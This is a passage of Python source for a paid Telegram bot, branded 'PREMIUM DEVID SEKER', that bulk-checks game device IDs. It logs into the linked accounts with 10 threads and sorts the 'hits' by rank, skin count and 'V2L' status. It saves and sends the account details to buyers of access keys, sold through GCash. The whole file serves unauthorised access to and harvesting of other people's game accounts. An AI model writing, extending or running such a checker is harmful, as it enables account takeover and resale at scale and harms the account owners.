    rank_category = get_rank_category(cur_rank)

    # JSON output
    json_str = format_json_card(device, acc, zone, pd, pd.get('gs_info', 'N/A'))

    rank_files = {
        "warrior": (FOLDERS["rank_warrior"], "warrior_hits.json"),
        "elite":   (FOLDERS["rank_elite"],   "elite_hits.json"),
        "master":  (FOLDERS["rank_master"],  "master_hits.json"),
        "gm":      (FOLDERS["rank_gm"],      "grandmaster_hits.json"),
        "epic":    (FOLDERS["rank_epic"],    "epic_hits.json"),
        "legend":  (FOLDERS["rank_legend"],  "legend_hits.json"),
        "mythic":  (FOLDERS["rank_mythic"],  "mythic_hits.json"),
    }

    with save_lock:
        # All hits — JSON array file
        all_file = os.path.join(base, FOLDERS["detail"], "all_hits_detail.json")
        os.makedirs(os.path.dirname(all_file), exist_ok=True)

        # Per-device JSON file (best for API/parsing)
        per_device_dir = os.path.join(base, FOLDERS["json"])
        os.makedirs(per_device_dir, exist_ok=True)
        safe_name = re.sub(r'[^A-Za-z0-9_.-]', '_', device)[:80]
        per_file = os.path.join(per_device_dir, f"{safe_name}.json")
        if not os.path.exists(per_file):
            with open(per_file, "w", encoding='utf-8') as f:
                f.write(json_str)

        # Append to all_hits as JSONL (one JSON per line)
        if not is_already_saved(device, all_file):
            with open(all_file, "a", encoding='utf-8') as f:
                f.write(json_str + "\n---\n")

        # Rank-specific
        if rank_category in rank_files:
            folder, fname = rank_files[rank_category]
            rfile = os.path.join(base, folder, fname)
            os.makedirs(os.path.dirname(rfile), exist_ok=True)
            if not is_already_saved(device, rfile):
                with open(rfile, "a", encoding='utf-8') as f:
                    f.write(json_str + "\n---\n")

        # V2L
        if v2l_text == "ACTIVE":
            vf = os.path.join(base, FOLDERS["v2l_active"], "v2l_active.json")
            os.makedirs(os.path.dirname(vf), exist_ok=True)
            if not is_already_saved(device, vf):
                with open(vf, "a", encoding='utf-8') as f: f.write(json_str + "\n---\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_active'] += 1
        elif v2l_text == "INACTIVE":
            vf = os.path.join(base, FOLDERS["v2l_inactive"], "v2l_inactive.json")
            os.makedirs(os.path.dirname(vf), exist_ok=True)
            if not is_already_saved(device, vf):
                with open(vf, "a", encoding='utf-8') as f: f.write(json_str + "\n---\n")
            with COUNTER_LOCK: HIT_COUNTERS['v2l_inactive'] += 1

        # Sultan
        if skin >= 200:
            sf = os.path.join(base, FOLDERS["sultan"], "sultan.json")
            os.makedirs(os.path.dirname(sf), exist_ok=True)
            if not is_already_saved(device, sf):
                with open(sf, "a", encoding='utf-8') as f: f.write(json_str + "\n---\n")
            with COUNTER_LOCK: HIT_COUNTERS['sultan'] += 1

    with COUNTER_LOCK:
        if rank_category in HIT_COUNTERS:
            HIT_COUNTERS[rank_category] += 1

# ────────────────────────────────────────────────────────────────
# GLOBAL STATE
# ────────────────────────────────────────────────────────────────

active_jobs: Dict[int, Dict] = {}
job_lock = threading.Lock()
start_time = time.time()

# ────────────────────────────────────────────────────────────────
# USER MANAGER
# ────────────────────────────────────────────────────────────────

class UserManager:
    def __init__(self):
        self._load()

    def _load(self):
        if USERS_FILE.exists():
            try:
                data = json.loads(USERS_FILE.read_text())
                self.users = data if "users" in data else {"users": {}}
            except: self.users = {"users": {}}
        else:
            self.users = {"users": {}}

        if KEYS_FILE.exists():
            try:
                data = json.loads(KEYS_FILE.read_text())
                self.keys = data if "keys" in data else {"keys": {}}
            except: self.keys = {"keys": {}}
        else:
            self.keys = {"keys": {}}

        self._save_users_sync()
        self._save_keys_sync()

    def _save_users_sync(self): USERS_FILE.write_text(json.dumps(self.users, indent=2))
    def _save_keys_sync(self):  KEYS_FILE.write_text(json.dumps(self.keys, indent=2))
    async def _save_users(self): self._save_users_sync()
    async def _save_keys(self):  self._save_keys_sync()

    async def register_user(self, user_id: int, username: str = None, first_name: str = None):
        uid = str(user_id)
        if uid not in self.users["users"]:
            self.users["users"][uid] = {
                "username": username,
                "first_name": first_name,
                "joined": datetime.now().isoformat(),
                "banned": False,
                "key_expiry": None,
                "stats": {"total_checked": 0, "total_hits": 0},
            }
            await self._save_users()
            return True
        return False

    async def is_authorized(self, user_id: int) -> Tuple[bool, str]:
        uid = str(user_id)
        if uid == str(OWNER_ID): return True, "admin"
        user = self.users["users"].get(uid)
        if not user: return False, "not_registered"
        if user.get("banned", False): return False, "banned"
        expiry = user.get("key_expiry")
        if expiry is None: return False, "no_key"
        try:
            if datetime.fromisoformat(expiry) < datetime.now(): return False, "key_expired"
        except: return False, "invalid_expiry"
        return True, "ok"

    async def ban_user(self, user_id: int):
        uid = str(user_id)
        if uid in self.users["users"]:
            self.users["users"][uid]["banned"] = True
            await self._save_users(); return True
        return False

    async def unban_user(self, user_id: int):
        uid = str(user_id)
        if uid in self.users["users"]:
            self.users["users"][uid]["banned"] = False
            await self._save_users(); return True
        return False

    async def set_key_expiry(self, user_id: int, expiry_dt: datetime):
        uid = str(user_id)
        if uid not in self.users["users"]: return False
        self.users["users"][uid]["key_expiry"] = expiry_dt.isoformat()
        await self._save_users()
        return True

    async def generate_key(self, duration: int, unit: str, quantity: int = 1, max_users: int = 1) -> Tuple[List[str], str]:
        if unit in ('lifetime', 'l'):
            expiry       = datetime(9999, 12, 31, 23, 59, 59)
            unit_display = "Lifetime"
        else:
            unit_map = {'s':1,'m':60,'h':3600,'d':86400,'y':31536000,
                        'hours':3600,'days':86400,'months':2592000}
            seconds  = duration * unit_map.get(unit.lower(), 86400)
            expiry   = datetime.now() + timedelta(seconds=seconds)
            unit_display = f"{duration} {unit}"

        keys = []
        for _ in range(quantity):
            key = f"PREM-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            while key in self.keys["keys"]:
                key = f"PREM-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            self.keys["keys"][key] = {
                "created": datetime.now().isoformat(),
                "expiry":  expiry.isoformat(),
                "used_by": [],
                "duration": unit_display,
                "max_users": max_users,
            }
            keys.append(key)
        await self._save_keys()
        return keys, unit_display

    async def redeem_key(self, user_id: int, key: str) -> Tuple[bool, str]:
        uid      = str(user_id)
        key_data = self.keys["keys"].get(key)
        if not key_data: return False, "Invalid key"
        used = key_data.get("used_by", [])
        if uid in used: return False, "Key already used by you"
        if len(used) >= key_data.get("max_users", 1): return False, "Key max users reached"
        exp = datetime.fromisoformat(key_data["expiry"])
        if exp < datetime.now(): return False, "Key expired"
        used.append(uid)
        key_data["used_by"] = used
        await self._save_keys()
        await self.set_key_expiry(user_id, exp)
        return True, f"Key redeemed! Valid until {exp.strftime('%Y-%m-%d %H:%M')}"

    async def get_all_users(self) -> Dict:
        return self.users["users"]

    async def get_user_info(self, user_id: int) -> Optional[Dict]:
        return self.users["users"].get(str(user_id))

    async def update_stats(self, user_id: int, checked: int = 0, hits: int = 0):
        uid  = str(user_id)
        user = self.users["users"].get(uid)
        if not user: return
        stats = user.setdefault("stats", {})
        stats["total_checked"] = stats.get("total_checked", 0) + checked
        stats["total_hits"]    = stats.get("total_hits", 0) + hits
        await self._save_users()

user_manager = UserManager()

# ────────────────────────────────────────────────────────────────
# CONFIG HELPERS
# ────────────────────────────────────────────────────────────────

DEFAULT_CONFIG = {"locked": False, "txn_counter": 0}

def load_config() -> dict:
    if CONFIG_FILE.exists():
        try:
            cfg = json.loads(CONFIG_FILE.read_text())
            for k, v in DEFAULT_CONFIG.items(): cfg.setdefault(k, v)
            return cfg
        except: pass
    return DEFAULT_CONFIG.copy()

def save_config(cfg: dict): CONFIG_FILE.write_text(json.dumps(cfg, indent=2))

def get_next_txn_number() -> int:
    cfg = load_config()
    cfg["txn_counter"] = cfg.get("txn_counter", 0) + 1
    save_config(cfg)
    return cfg["txn_counter"]

# ────────────────────────────────────────────────────────────────
# KEYBOARDS
# ────────────────────────────────────────────────────────────────

def kb_no_key():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Buy Access Key", callback_data="menu_buy")],
        [InlineKeyboardButton("📖 Help", callback_data="menu_help")],
    ])

def kb_main(admin: bool = False):
    rows = [
        [InlineKeyboardButton("🔥 Bulk Check (10 Threads)", callback_data="tool_bulk")],
        [InlineKeyboardButton("🔍 Single Account Check", callback_data="tool_single")],
        [InlineKeyboardButton("📊 Live Statistics", callback_data="tool_stats")],
        [InlineKeyboardButton("💳 Buy Key", callback_data="menu_buy"),
         InlineKeyboardButton("📖 Help", callback_data="menu_help")],
    ]
    if admin:
        rows.append([InlineKeyboardButton("👑 ADMIN PANEL", callback_data="open_admin_panel")])
    return InlineKeyboardMarkup(rows)

def kb_admin_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gen Key",    callback_data="adm_genkey"),
         InlineKeyboardButton("👥 Users",      callback_data="adm_users")],
        [InlineKeyboardButton("📊 Stats",      callback_data="adm_stats"),
         InlineKeyboardButton("⚡ Running",    callback_data="adm_running")],
        [InlineKeyboardButton("🔄 Refresh",    callback_data="adm_refresh")],
    ])

GCASH_PLANS = {
    "plan_3d":   {"label": "3 Days",   "price": "₱50",  "dtype": "days",     "dval": 3},
    "plan_7d":   {"label": "7 Days",   "price": "₱70",  "dtype": "days",     "dval": 7},
    "plan_30d":  {"label": "1 Month",  "price": "₱100", "dtype": "days",     "dval": 30},
    "plan_life": {"label": "Lifetime", "price": "₱150", "dtype": "lifetime", "dval": 0},
}

def kb_gcash_plans():
    rows = [[InlineKeyboardButton(f"{p['label']} · {p['price']}", callback_data=f"gcash_sel:{k}")]
            for k, p in GCASH_PLANS.items()]
    return InlineKeyboardMarkup(rows)

def kb_gcash_admin(buyer_uid, plan_key):
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✔ APPROVE", callback_data=f"gcash_approve:{buyer_uid}:{plan_key}"),
        InlineKeyboardButton("✖ DENY",    callback_data=f"gcash_deny:{buyer_uid}:{plan_key}"),
    ]])

def fmt_expiry(exp: Optional[str]) -> str:
    if not exp: return "Lifetime"
    try:
        e = datetime.fromisoformat(exp)
        if e < datetime.now(): return "Expired"
        diff = e - datetime.now()
        d, h = diff.days, diff.seconds // 3600
        m = (diff.seconds % 3600) // 60
        parts = []
        if d: parts.append(f"{d}d")
        if h: parts.append(f"{h}h")
        if m and not d: parts.append(f"{m}m")
        return " ".join(parts) + " left"
    except: return exp

def admin_only(fn):
    @wraps(fn)
    async def wrapper(update, context):
        if update.effective_user.id != OWNER_ID:
            if update.message:
                await update.message.reply_text("❌ Admin only.")
            return
        return await fn(update, context)
    return wrapper

# ────────────────────────────────────────────────────────────────
# ZIP HELPER
# ────────────────────────────────────────────────────────────────

TG_MAX_BYTES = 49 * 1024 * 1024

def zip_results(folder: Path) -> List[Path]:
    folder = Path(folder)
    files  = sorted([f for f in folder.rglob("*") if f.is_file() and not f.name.endswith(".zip")])
    if not files: return []
    out = folder / "results.zip"
    try:
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in files:
                zf.write(f, f.relative_to(folder))
        if out.stat().st_size <= TG_MAX_BYTES: return [out]
        out.unlink()
        parts, part_num, cur_files, cur_size = [], 1, [], 0
        for f in files:
            fsize = f.stat().st_size
            if cur_files and cur_size + fsize > TG_MAX_BYTES:
                pout = folder / f"results_part{part_num}.zip"
                with zipfile.ZipFile(pout, "w", zipfile.ZIP_DEFLATED) as zf:
                    for cf in cur_files: zf.write(cf, cf.relative_to(folder))
                parts.append(pout); part_num += 1; cur_files = []; cur_size = 0
            cur_files.append(f); cur_size += fsize
        if cur_files:
            pout = folder / f"results_part{part_num}.zip"
            with zipfile.ZipFile(pout, "w", zipfile.ZIP_DEFLATED) as zf:
                for cf in cur_files: zf.write(cf, cf.relative_to(folder))
            parts.append(pout)
        return parts
    except Exception as e:
        log.error(f"Zip error: {e}")
        return []

# ────────────────────────────────────────────────────────────────
# BULK JOB
# ────────────────────────────────────────────────────────────────

def run_bulk_job(job: dict, loop, app):
    user_id = job["user_id"]
    chat_id = job["chat_id"]
    msg_id  = job["msg_id"]
    devices = job["devices"]

    session_ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
    session_dir = os.path.join(RESULTS_DIR, f"session_{user_id}_{session_ts}")
    os.makedirs(session_dir, exist_ok=True)
    for sub in FOLDERS.values():
        os.makedirs(os.path.join(session_dir, sub), exist_ok=True)

    stats = {"checked": 0, "total": len(devices), "hits": 0, "banned": 0, "failed": 0}
    job["stats"] = stats

    _last_update = [0.0]
    _UPDATE_MIN  = 1.2

    def update_msg(force=False):
        now = time.time()
        if not force and (now - _last_update[0]) < _UPDATE_MIN: return
        _last_update[0] = now
        elapsed = int(now - job["started"])
        speed   = stats["checked"] / max(elapsed, 1)
        pct     = stats["checked"] / max(stats["total"], 1) * 100
        filled  = int(20 * pct / 100)
        bar     = "█" * filled + "░" * (20 - filled)
        text = (
            f"🔥 *{BOT_NAME} — Bulk Check (10 threads)*\n"
            f"{'─'*32}\n\n"
            f"`{bar}` {pct:.1f}%\n\n"
            f"✅ Hits    : `{stats['hits']}`\n"
            f"🚫 Banned  : `{stats['banned']}`\n"
            f"❌ Failed  : `{stats['failed']}`\n"
            f"📊 Checked : `{stats['checked']}/{stats['total']}`\n"
            f"⚡ Speed   : `{speed:.1f}/s`\n"
            f"⏱ Elapsed : `{elapsed}s`\n"
        )
        kb = [[InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{user_id}")]]
        try:
            fut = asyncio.run_coroutine_threadsafe(
                app.bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id,
                    text=text, parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup(kb)
                ), loop
            )
            fut.result(timeout=10)
        except Exception as e:
            log.debug(f"update_msg skipped: {e}")

    import queue as _queue
    hit_queue = _queue.Queue()
    _last_hit_sent = [0.0]
    _HIT_MIN_INTERVAL = 0.8

    def hit_sender():
        while True:
            msg = hit_queue.get()
            if msg is None: break
            for attempt in range(3):
                try:
                    elapsed = time.time() - _last_hit_sent[0]
                    if elapsed < _HIT_MIN_INTERVAL:
                        time.sleep(_HIT_MIN_INTERVAL - elapsed)
                    fut = asyncio.run_coroutine_threadsafe(
                        app.bot.send_message(chat_id=chat_id, text=msg),
                        loop
                    )
                    fut.result(timeout=15)
                    _last_hit_sent[0] = time.time()
                    break
                except Exception as e:
                    log.error(f"Hit sender attempt {attempt+1}: {e}")
                    time.sleep(1.5)

    hs_thread = threading.Thread(target=hit_sender, daemon=False)
    hs_thread.start()

    def worker(device_id: str):
        if job.get("stopped"): return
        acc, zone, stat = GameLogin(device_id).run()

        if not acc or not zone:
            with job_lock:
                stats["checked"] += 1
                if 'ban' in stat.lower(): stats["banned"] += 1
                else:                     stats["failed"] += 1
                job["checked"] = stats["checked"]
            update_msg()
            return

        success, pd = process_detail(device_id, acc, zone, session_dir)
        with job_lock:
            stats["checked"] += 1
            job["checked"] = stats["checked"]

        if success and pd:
            is_banned = any(x in str(pd.get('ban_status', '')) for x in ('Ban','Suspend','Restrict'))
            if is_banned:
                with job_lock: stats["banned"] += 1
            else:
                if pd.get('nickname','') not in ('', 'N/A', 'Unknown', 'guest'):
                    with job_lock: stats["hits"] += 1

            # Send JSON as code block
            json_card = format_json_card(device_id, acc, zone, pd, pd.get('gs_info', 'N/A'))
            hit_msg = f"🎯 *HIT — `{device_id}`*\n```json\n{json_card}\n```"
            hit_queue.put(hit_msg)
        else:
            with job_lock: stats["failed"] += 1
        update_msg()

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures  = [ex.submit(worker, dev) for dev in devices]
        last_cnt = -1
        while True:
            with job_lock:
                cur  = stats["checked"]
                done = (cur >= stats["total"]) or job.get("stopped")
            if cur != last_cnt:
                last_cnt = cur
                update_msg()
            if done: break
            time.sleep(0.05)
        update_msg(force=True)
        for f in futures: f.cancel()

    hit_queue.put(None)
    hs_thread.join(timeout=120)

    asyncio.run_coroutine_threadsafe(
        user_manager.update_stats(user_id, checked=stats["checked"], hits=stats["hits"]),
        loop
    )

    elapsed = int(time.time() - job["started"])
    speed   = stats["checked"] / max(elapsed, 1)
    summary = (
        f"🏁 *Bulk Check Complete!*\n"
        f"{'─'*32}\n\n"
        f"📦 Total   : `{stats['total']}`\n"
        f"✅ Hits    : `{stats['hits']}`\n"
        f"🚫 Banned  : `{stats['banned']}`\n"
        f"❌ Failed  : `{stats['failed']}`\n\n"
        f"⏱ Time    : `{elapsed}s`\n"
        f"⚡ Speed   : `{speed:.1f}/s`\n\n"
        f"👑 *PREMIUM DEVID SEKER*"
    )

    time.sleep(1.0)
    edited = False
    for attempt in range(4):
        try:
            fut = asyncio.run_coroutine_threadsafe(
                app.bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id,
                    text=summary, parse_mode="Markdown"
                ), loop
            )
            fut.result(timeout=30)
            edited = True
            break
        except Exception as e:
            log.warning(f"Summary edit attempt {attempt+1} failed: {e}")
            time.sleep(2)

    if not edited:
        for attempt in range(3):
            try:
                fut = asyncio.run_coroutine_threadsafe(
                    app.bot.send_message(chat_id=chat_id, text=summary, parse_mode="Markdown"), loop
                )
                fut.result(timeout=30)
                break
            except Exception as e:
                log.error(f"Summary send attempt {attempt+1}: {e}")
                time.sleep(2)

    try:
        zips = zip_results(Path(session_dir))
        for zp in zips[:3]:
            for attempt in range(3):
                try:
                    with open(zp, "rb") as f:
                        fut = asyncio.run_coroutine_threadsafe(
                            app.bot.send_document(
                                chat_id=chat_id, document=f,
                                filename=f"results_{session_ts}.zip"
                            ), loop
                        )
                        fut.result(timeout=60)
                    break
                except Exception as e:
                    log.error(f"Send zip attempt {attempt+1}: {e}")
                    time.sleep(2)
        shutil.rmtree(session_dir, ignore_errors=True)
    except Exception as e:
        log.error(f"Zip send error: {e}")

    with job_lock:
        active_jobs.pop(user_id, None)

# ────────────────────────────────────────────────────────────────
# COMMANDS
# ────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    auth, reason = await user_manager.is_authorized(uid)

    if auth:
        user_info = await user_manager.get_user_info(uid)
        stats     = user_info.get("stats", {})
        expiry_s  = user_info.get("key_expiry")
        if expiry_s:
            try:
                exp = datetime.fromisoformat(expiry_s)
                exp_display = "Lifetime" if exp.year == 9999 else exp.strftime("%Y-%m-%d %H:%M")
            except: exp_display = "Unknown"
        else:
            exp_display = "Admin" if uid == OWNER_ID else "None"

        text = (
            f"🔥 *PREMIUM DEVID SEKER*\n"
            f"👑 Owner: Admin\n\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"📊 *YOUR STATS*\n"
            f"┣ 🔍 Checked : `{stats.get('total_checked',0)}`\n"
            f"┗ 🎯 Hits    : `{stats.get('total_hits',0)}`\n\n"
            f"🔑 *ACCESS*\n"
            f"┗ ⏳ Expiry  : `{exp_display}`\n\n"
            f"⚙️ Threads   : `10` (fixed)\n"
            f"⏱ Uptime    : `{int(time.time() - start_time)}s`\n"
            f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
            f"📤 *Choose a tool below.*"
        )
        await update.message.reply_text(text, parse_mode="Markdown",
                                        reply_markup=kb_main(uid == OWNER_ID))
    else:
        await update.message.reply_text(
            f"🚫 *ACCESS RESTRICTED*\n\n"
            f"This tool requires an access key.\n\n"
            f"💳 *GET ACCESS*\n"
            f"┣ 3 Days   · ₱50\n"
            f"┣ 7 Days   · ₱70\n"
            f"┣ 1 Month  · ₱100\n"
            f"┗ Lifetime · ₱150\n\n"
            f"Use `/redeem <key>` if you already have a key.",
            parse_mode="Markdown",
            reply_markup=kb_no_key()
        )

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not ctx.args:
        await update.message.reply_text("Usage: `/redeem <key>`", parse_mode="Markdown"); return
    key = ctx.args[0].strip()
    success, msg = await user_manager.redeem_key(uid, key)
    if success:
        user_info = await user_manager.get_user_info(uid)
        exp = datetime.fromisoformat(user_info["key_expiry"])
        await update.message.reply_text(
            f"✅ *KEY REDEEMED!*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 Key     : `{key}`\n"
            f"⏳ Valid until: `{exp.strftime('%Y-%m-%d %H:%M')}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Use /start to begin.",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(f"❌ {msg}")

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📖 *{BOT_NAME} Help*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 *Bulk Check* – send a `.txt` file with device IDs (10 threads)\n"
        f"🔍 *Single Check* – send one device ID as text\n"
        f"📊 *Live Statistics* – view hit counters\n\n"
        f"`/redeem <key>` — Activate key\n"
        f"`/start` — Dashboard\n"
        f"`/stop` — Stop job\n"
        f"`/status` — Job status\n\n"
        f"📄 All results are saved as JSON.",
        parse_mode="Markdown"
    )

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with job_lock:
        job = active_jobs.get(uid)
    if job:
        job["stopped"] = True
        await update.message.reply_text("🛑 Stopping...")
    else:
        await update.message.reply_text("No active job.")

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with job_lock:
        job = active_jobs.get(uid)
    if job:
        await update.message.reply_text(
            f"⚡ Job running — `{job.get('checked',0)}/{job.get('total',0)}` checked",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("No active job.")

@admin_only
async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👑 *Admin Panel*", reply_markup=kb_admin_main(), parse_mode="Markdown")

@admin_only
async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    args  = ctx.args or []
    usage = "`/genkey hours 24 1`\n`/genkey days 7 1`\n`/genkey months 1 1`\n`/genkey lifetime 1`"
    try:
        if not args: raise ValueError
        dt = args[0].lower()
        if dt not in ("hours","days","months","lifetime"): raise ValueError
        if dt == "lifetime":
            dv = 0; mu = int(args[1]) if len(args) > 1 else 1
        else:
            if len(args) < 3: raise ValueError
            dv = int(args[1]); mu = int(args[2])
            if dv < 1: raise ValueError
        if mu < 1: raise ValueError
    except:
        await update.message.reply_text(f"Usage:\n{usage}", parse_mode="Markdown"); return
    keys, _ = await user_manager.generate_key(dv, dt, 1, mu)
    key = keys[0]
    exp = user_manager.keys["keys"][key]["expiry"]
    dd  = {"hours":f"{dv}h","days":f"{dv}d","months":f"{dv}mo","lifetime":"Lifetime"}[dt]
    await update.message.reply_text(
        f"🔑 *Key Generated!*\n━━━━━━━━━━━━━━━━━━━━\n`{key}`\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Duration : `{dd}`\nExpires  : {fmt_expiry(exp)}\nMax users: `{mu}`",
        parse_mode="Markdown"
    )

@admin_only
async def cmd_ban_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/ban_user <id>`", parse_mode="Markdown"); return
    t = ctx.args[0].strip()
    ok = await user_manager.ban_user(int(t))
    await update.message.reply_text(f"User `{t}` {'banned' if ok else 'not found'}.", parse_mode="Markdown")

@admin_only
async def cmd_unban_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/unban_user <id>`", parse_mode="Markdown"); return
    t = ctx.args[0].strip()
    ok = await user_manager.unban_user(int(t))
    await update.message.reply_text(f"User `{t}` {'unbanned' if ok else 'not found'}.", parse_mode="Markdown")

@admin_only
async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    users = await user_manager.get_all_users()
    total  = len(users)
    active = sum(1 for u in users.values() if u.get("key_expiry"))
    banned = sum(1 for u in users.values() if u.get("banned"))
    with COUNTER_LOCK:
        rank_stats = "\n".join(
            f"┣ {r.capitalize():<12}: `{HIT_COUNTERS.get(r,0)}`"
            for r in ['warrior','elite','master','gm','epic','legend','mythic']
        )
    await update.message.reply_text(
        f"📊 *Bot Statistics*\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Users: `{total}` · Active: `{active}` · Banned: `{banned}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n*Rank Hits:*\n{rank_stats}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"V2L Active   : `{HIT_COUNTERS.get('v2l_active',0)}`\n"
        f"V2L Inactive : `{HIT_COUNTERS.get('v2l_inactive',0)}`\n"
        f"Sultan       : `{HIT_COUNTERS.get('sultan',0)}`\n"
        f"Banned       : `{HIT_COUNTERS.get('banned',0)}`",
        parse_mode="Markdown"
    )

@admin_only
async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/broadcast Your message`", parse_mode="Markdown"); return
    msg   = " ".join(ctx.args)
    users = await user_manager.get_all_users()
    sent  = 0
    for uid in users:
        try:
            await ctx.bot.send_message(
                chat_id=int(uid),
                text=f"📢 *Announcement*\n━━━━━━━━━━━━━━━━━━━━\n{msg}",
                parse_mode="Markdown"
            )
            sent += 1
        except: pass
        await asyncio.sleep(0.05)
    await update.message.reply_text(f"Broadcast sent to `{sent}` users.", parse_mode="Markdown")

@admin_only
async def cmd_remove_key(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/remove_key <user_id>`", parse_mode="Markdown"); return
    t     = ctx.args[0].strip()
    users = await user_manager.get_all_users()
    if t not in users:
        await update.message.reply_text(f"User `{t}` not found.", parse_mode="Markdown"); return
    users[t]["key_expiry"] = None
    await user_manager._save_users()
    await update.message.reply_text(f"Key removed for user `{t}`.", parse_mode="Markdown")

# ────────────────────────────────────────────────────────────────
# DOCUMENT HANDLER (BULK)
# ────────────────────────────────────────────────────────────────

async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    auth, reason = await user_manager.is_authorized(uid)
    if not auth:
        await update.message.reply_text(
            f"🚫 Access denied: `{reason}`\nUse /redeem <key> to activate.",
            parse_mode="Markdown"
        ); return

    with job_lock:
        wants_bulk = active_jobs.get(uid, {}).get("awaiting_bulk_file")

    if not wants_bulk:
        await update.message.reply_text(
            "Use /start → 🔥 Bulk Check first, then send your `.txt` file.",
            parse_mode="Markdown"
        ); return

    with job_lock:
        if uid in active_jobs and active_jobs[uid].get("status") == "running":
            await update.message.reply_text("⚠️ You already have an active job. Use /stop first.")
            return

    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Please send a `.txt` file with device IDs."); return

    file  = await ctx.bot.get_file(doc.file_id)
    data  = await file.download_as_bytearray()
    lines = [l.strip() for l in data.decode(errors="ignore").splitlines() if l.strip()]

    if not lines:
        await update.message.reply_text("No device IDs found in file."); return

    prog_msg = await update.message.reply_text(
        f"🔥 *{BOT_NAME} — Bulk Check (10 Threads)*\n{'─'*32}\n\n"
        f"▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ 0%\n\n"
        f"📦 Loaded `{len(lines)}` device IDs\n"
        f"🔄 Starting with `10` threads...",
        parse_mode="Markdown"
    )

    job = {
        "user_id": uid, "chat_id": update.effective_chat.id,
        "msg_id":  prog_msg.message_id, "devices": lines,
        "stopped": False, "checked": 0, "total": len(lines),
        "started": time.time(), "status": "running",
    }
    with job_lock:
        active_jobs[uid] = job

    loop = asyncio.get_event_loop()
    threading.Thread(target=run_bulk_job, args=(job, loop, ctx.application), daemon=True).start()

# ────────────────────────────────────────────────────────────────
# TEXT HANDLER (SINGLE CHECK)
# ────────────────────────────────────────────────────────────────

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    auth, reason = await user_manager.is_authorized(uid)

    with job_lock:
        awaiting_single = active_jobs.get(uid, {}).get("awaiting_single_device")

    if not (awaiting_single and auth):
        return

    device_id = update.message.text.strip()
    with job_lock:
        active_jobs.get(uid, {}).pop("awaiting_single_device", None)
        if not active_jobs.get(uid): active_jobs.pop(uid, None)

    await update.message.reply_text(
        f"🔍 *Checking device...*\n`{device_id}`\nThis may take up to 30s.",
        parse_mode="Markdown"
    )

    acc, zone, stat = GameLogin(device_id).run()
    if not acc or not zone:
        await update.message.reply_text(f"❌ Login failed: {stat}"); return

    success, pd = process_detail(device_id, acc, zone, OUTPUT_DIR)
    if not success or not pd:
        await update.message.reply_text("❌ Failed to retrieve account details."); return

    json_card = format_json_card(device_id, acc, zone, pd, pd.get('gs_info', 'N/A'))
    header = f"🎯 *RESULT — `{device_id}`*\n"
    body   = f"```json\n{json_card}\n```"

    # Telegram caps messages at ~4096 chars; split if needed
    full = header + body
    if len(full) <= 4000:
        await update.message.reply_text(full, parse_mode="Markdown")
    else:
        await update.message.reply_text(header, parse_mode="Markdown")
        chunk_size = 3800
        for i in range(0, len(json_card), chunk_size):
            chunk = json_card[i:i + chunk_size]
            await update.message.reply_text(f"```json\n{chunk}\n```", parse_mode="Markdown")

    is_banned = any(x in str(pd.get('ban_status', '')) for x in ('Ban','Suspend','Restrict'))
    await user_manager.update_stats(uid, checked=1, hits=(0 if is_banned else 1))

# ────────────────────────────────────────────────────────────────
# PHOTO HANDLER (GCASH RECEIPT)
# ────────────────────────────────────────────────────────────────

async def on_photo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with job_lock:
        plan_key = active_jobs.get(uid, {}).get("awaiting_receipt")
    if not plan_key: return
